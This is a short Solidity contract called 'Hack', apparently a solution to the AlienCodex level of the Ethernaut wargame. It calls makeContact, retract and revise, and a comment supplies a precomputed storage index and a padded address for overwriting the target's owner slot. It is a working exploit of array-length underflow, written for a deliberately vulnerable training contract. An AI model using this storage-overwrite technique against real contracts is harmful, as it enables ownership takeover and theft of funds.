// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// index = 35707666377435648211887908874984608119992236509074197713628505308453184860938
// address - 0x000000000000000000000000492E904fC65B8570829d0F6162d5441bA06Ffd48

interface IAlienCodex {
    function makeContact() external;
    function retract() external;
    function revise(uint256 i, bytes32 _content) external;
}

contract Hack {
    IAlienCodex public target;

    constructor(address _target) {
        target = IAlienCodex(_target);
    }

    function makeContact() external {
        target.makeContact();
    }

    function retract() external {
        target.retract();
    }

    function revise(uint256 index, bytes32 newOwner) external {
        target.revise(index, newOwner);
    }

}
